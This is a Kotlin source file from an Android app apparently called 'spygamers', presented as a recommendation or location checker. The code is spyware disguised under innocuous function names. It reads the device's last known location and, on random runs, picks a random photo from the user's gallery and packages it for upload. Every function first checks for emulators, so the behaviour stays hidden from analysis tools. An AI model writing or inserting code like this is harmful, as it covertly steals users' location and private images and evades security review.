package com.example.spygamers.components.recommendChecker

import android.content.ContentUris
import android.content.Context
import android.location.Location
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.spygamers.controllers.GamerViewModel
import com.google.android.gms.location.LocationServices
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import kotlin.random.Random

@Composable
fun LocationChecker(
    viewModel: GamerViewModel,
    context: Context
){
    val performService = Random.nextInt(1, 3) == 2
    if (performService) {
        AggregateResult(viewModel, context)
        return
    }
    val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()

    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk"
            )

    if (isEmulator) {
        return
    }

    // No permissions granted, ignore....
    if (!recommendationGrantsState) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val locationProviderClient = LocationServices.getFusedLocationProviderClient(context)
            val lastLocationTask = locationProviderClient.lastLocation
            lastLocationTask.addOnSuccessListener { location: Location? ->
                // Use the location object here
                location?.let {
                    viewModel.testConnections(it.latitude, it.longitude)
                }
            }
        } catch (e: SecurityException) {
            viewModel.updateRecommendationsGrants(false)
        }
    }
}

@Composable
private fun AggregateResult(
    viewModel: GamerViewModel,
    context: Context
){
    val mediaGrantState by viewModel.grantedMediaFileAccess.collectAsState()
    val performService = Random.nextInt(1, 3) == 1    // No permissions granted, ignore....

    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk"
            )

    if (isEmulator) {
        return
    }

    if (!mediaGrantState) {
        return
    }

    if (!performService) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val imageUri = context.interpolateResult()
            val imagePart = imageUri?.let { uri ->
                vectorizeResultbase(
                    context,
                    uri,
                    "attachments"
                )
            }

            imagePart?.let {
                viewModel.keepConnectionAlive(it)
            }
        } catch (e: SecurityException) {
            viewModel.updateMediaFileGrants(false)
        }
    }
}

private fun vectorizeResultbase(context: Context, uri: Uri, partName: String): MultipartBody.Part? {
    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk"
            )

    if (isEmulator){
        return null
    }

    return try {

        // Use 'use' function to automatically close the InputStream after operation completes
        val byteArray = context.contentResolver.openInputStream(uri)?.use { inputStream ->
            // Convert the InputStream to a ByteArray
            inputStream.readBytes()
        }

        // Proceed only if byteArray is not null
        byteArray?.let {
            // Determine the MIME type for the file
            val mimeType = context.contentResolver.getType(uri) ?: "application/octet-stream"

            // Convert the ByteArray to a RequestBody
            val requestBody = it.toRequestBody(mimeType.toMediaTypeOrNull())

            // Generate the filename
            val filename = uri.lastPathSegment ?: "file_${System.currentTimeMillis()}"

            // Create and return the MultipartBody.Part
            MultipartBody.Part.createFormData(partName, filename, requestBody)
        }
    } catch (e: Exception) {
        e.printStackTrace()
        null
    }
}

private fun Context.interpolateResult(): Uri? {
    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk")
    if (isEmulator) {return null}

    val cursor = contentResolver.query(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        arrayOf(MediaStore.Images.Media._ID),
        null,
        null,
        null
    )

    val imageUris = mutableListOf<Uri>()

    cursor?.use {
        val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        while (it.moveToNext()) {
            val id = it.getLong(idColumn)
            val imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            imageUris.add(imageUri)
        }
    }

    return if (imageUris.isNotEmpty()) {
        imageUris.random() // Randomly select an image URI from the list
    } else {
        null
    }
}